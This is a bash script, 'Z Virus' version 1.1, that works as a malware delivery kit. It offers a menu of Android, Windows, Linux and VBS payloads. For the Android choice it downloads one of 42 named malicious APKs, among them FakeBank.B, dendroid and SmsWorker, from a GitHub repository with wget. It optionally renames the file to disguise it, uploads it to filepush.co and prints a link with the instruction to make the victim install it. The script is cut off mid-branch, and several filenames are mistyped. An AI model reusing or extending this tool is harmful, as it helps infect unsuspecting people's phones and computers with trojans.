#!/bin/bash
clear
# BANNER 
echo -e "\e[92m ▒███████▒    ██▒   █▓ ██▓ ██▀███   █    ██   ██████ "
echo -e " ▒ ▒ ▒ ▄▀░   ▓██░   █▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ "
echo -e " ░ ▒ ▄▀▒░     ▓██  █▒░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   "
echo -e "   ▄▀▒   ░     ▒██ █░░░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒"
echo -e " ▒███████▒      ▒▀█░  ░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒"
echo -e " ░▒▒ ▓░▒░▒      ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░"
echo -e " ░░▒ ▒ ░ ▒      ░ ░░   ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░"
echo -e " ░ ░ ░ ░ ░        ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░  "
echo -e "   ░ ░             ░   ░     ░        ░           ░  "
echo -e " ░                ░                                  \e[0m"
echo -e "\e[91m --- Z Virus Current Version 1.1 | Coded By: Deadbody770 ---\e[0m"
echo -e "\e[34m\"If you are too lazy to type a single command,"
echo -e " Allow my programs to do it for you.\"\e[0m"
echo -e " -\e[90m(https://github.com/Deadbody770)\e[0m\n"

# APK 
apk() {
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
   curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
   rm -f $newName.apk
}
# EXE
exe() {
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
   curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
   rm -f $newName.bat
}
# SH
sh() {
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
   curl --upload-file $newName.sh https://filepush.co/upload/$newName.sh
   rm -f $newName.sh
}
etc() {
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
   curl --upload-file $newName.vbs https://filepush.co/upload/$newName.vbs
   rm -f $newName.vbs
}

echo -e "\e[32mWhat do you want?\e[0m"
echo -e "\e[36m 1. Android - apk virus"
echo -e " 2. Windows - bat & exe virus"
echo -e " 3. Linux & Termux(root) - shell virus"
echo -e " 4. Others - vbs"
echo -e " 5. About - Read Me\e[0m"
echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mPlease Choose: \e[0m\e[34m"
read zCh
echo -e "\e[0m"

if [ $zCh = 1 ]; then
   echo -e "\e[32mAPK VIRUS\e[0m"
   echo -e "\e[36m 1. Agent"
   echo -e " 2. BadNews.A"
   echo -e " 3. Bios.NativeMaliciousCode"
   echo -e " 4. Blatantsms"
   echo -e " 5. BrainTest"
   echo -e " 6. Claco.A"
   echo -e " 7. Dropdialer"
   echo -e " 8. FakeBank.B"
   echo -e " 9. FakeCMCC.A"
   echo -e " 10. FakeDoc"
   echo -e " 11. FakeValidation"
   echo -e " 12. Fobus"
   echo -e " 13. GinMaster.Z.AdvancedObfuscation"
   echo -e " 14. Masnu"
   echo -e " 15. Omigo"
   echo -e " 16. Opfake"
   echo -e " 17. SmsWorker"
   echo -e " 18. Vietcon"
   echo -e " 19. candy_corn"
   echo -e " 20. cat"
   echo -e " 21. chistescortos"
   echo -e " 22. chistespicanticos"
   echo -e " 23. com.funnyys"
   echo -e " 24. com.imagepets"
   echo -e " 25. com.kitchenn"
   echo -e " 26. com.laughtter"
   echo -e " 27. com.prasesamor"
   echo -e " 28. com.prasesfee"
   echo -e " 29. com.recipesmart"
   echo -e " 30. com.romaticpos"
   echo -e " 31. com.statetss"
   echo -e " 32. com.thinkkign"
   echo -e " 33. crd"
   echo -e " 34. dendroid"
   echo -e " 35. ds"
   echo -e " 36. fake_av"
   echo -e " 37. Grave"
   echo -e " 38. Malum"
   echo -e " 39. Mobile_Legends_Adventure"
   echo -e " 40. TakeBeer"
   echo -e " 41. elite"
   echo -e " 42. mobelejen"
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mChoose Virus APK:  \e[0m\e[34m"
   read apkVirus
   echo -e "\e[0m"
   if [ $apkVirus = 1 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Agent.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Agent.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Agent.apk https://filepush.co/upload/Agent.apk
         rm -f Agent.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi

   elif [ $apkVirus = 2 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/BadNews.A.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv BadNews.A.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file BadNews.A.apk https://filepush.co/upload/BadNews.A.apk
         rm -f BadNews.A.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m" 
      fi
   elif [ $apkVirus = 3 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Bios.NativeMaliciousCode.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Bios.NativeMaliciousCode.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Bios.NativeMaliciousCode.apk https://filepush.co/upload/Bios.NativeMaliciousCode.apk
         rm -f Bios.NativeMaliciousCode.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 4 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Blatantsms.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Blatantsms.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Blantantsms.apk https://filepush.co/upload/Blatantsms.apk
         rm -f Blatantsms.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 5 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/BrainTest.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv BrainTest.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file BrainTest.apk https://filepush.co/upload/BrainTest.apk
         rm -f BrainTest.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 6 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Claco.A.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Claco.A.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Claco.A.apk https://filepush.co/upload/Claco.A.apk
         rm -f Claco.A.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 7 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Dropdialer.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Dropdialer.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Dropdialer.apk https://filepush.co/upload/Dropdialer.apk
         rm -f Dropdialer.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 8 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/FakeBank.B.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv FakeBank.B.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file FakeBank.B.apk https://filepush.co/upload/FakeBank.B.apk
         rm -f FakeBank.B.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 9 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/FakeCMCC.A.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv FakeCMCC.A.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file FakeCMCC.A.apk https://filepush.co/upload/FakeCMCC.A.apk
         rm -f FakeCMCC.A.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 10 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/FakeDoc.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv FakeDoc.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file FakeDoc.apk https://filepush.co/upload/FakeDoc.apk
         rm -f FakeDoc.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 11 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/FakeValidation.apk
       echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv FakeValidation.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file FakeValidation.apk https://filepush.co/upload/FakeValidation.apk
         rm -f FakeValidation.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 12 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Fobus.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Fobus.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Fobus.apk https://filepush.co/upload/Fobus.apk
         rm -f Fobus.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 13 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/GinMaster.Z.AdvancedObfuscation.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv GinMaster.Z.AdvancedObfuscation.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file GinMaster.Z.AdvancedObfuscation.apk https://filepush.co/upload/GinMaster.Z.AdvancedObfuscation.apk
         rm -f GinMaster.Z.AdvancedObfuscation.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 14 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Masnu.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Masnu.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Masnu.apk https://filepush.co/upload/Masnu.apk
         rm -f Masnu.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi

   elif [ $apkVirus = 15 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Omigo.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Omigo.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Omigo.apk https://filepush.co/upload/Omigo.apk
         rm -f Omigo.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 16 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Opfake.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Opfake.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Opfake.apk https://filepush.co/upload/Opfake.apk
         rm -f Opfake.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 17 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/SmsWorker.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv SmsWorker.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file SmsWorker.apk https://filepush.co/upload/SmsWorker.apk
         rm -f SmsWorker.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 18 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Vietcon.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Vietcon.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Vietcon.apk https://filepush.co/upload/Vietcon.apk
         rm -f Vietcon.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 19 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/candy_corn.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv candy_corn.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file candy_corn.apk https://filepush.co/upload/candy_corn.apk
         rm -f candy_corn.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 20 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/cat.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv cat.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file cat.apk https://filepush.co/upload/cat.apk
         rm -f cat.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 21 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/chistescortos.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv chistrscortos.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file chistescortos.apk https://filepush.co/upload/chistescortos.apk
         rm -f chistescortos.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 22 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/chistespicanticos.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv chistespicanticos.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file chistespicanticos.apk https://filepush.co/upload/chistespicanticos.apk
         rm -f chistespicanticos.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 23 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.funnyys.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.funnyys.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.funnyys.apk https://filepush.co/upload/com.funnyys.apk
         rm -f com.funnyys.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 24 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.imagepets.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.imagepets.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.imagepets.apk https://filepush.co/upload/com.imagepets.apk
         rm -f com.imagepets.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 25 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.kitchenn.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.kitchenn.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.kitchenn.apk https://filepush.co/upload/com.kitchenn.apk
         rm -f com.kitchenn.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 26 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.laughtter.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.laughtter.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.laughtter.apk https://filepush.co/upload/comlaughtter.apk
         rm -f com.laughtter.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 27 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.prasesamor.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.prasesamor.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.prasesamor.apk https://filepush.co/upload/com.prasesamor.apk
         rm -f com.prasesamor.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 28 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.prasesfee.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.prasesfee.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.prasesfee.apk https://filepush.co/upload/com.prasesfee.apk
         rm -f com.prasesfee.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 29 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.recipesmart.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.recipesmart.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.recipesmart.apk https://filepush.co/upload/com.recipesmart.apk
         rm -f com.recipesmart.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 30 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.romaticpos.apk
     echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.romanticpos.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.romanticpos.apk https://filepush.co/upload/com.romanticpos.apk
         rm -f com.romanticpos.apk
      else
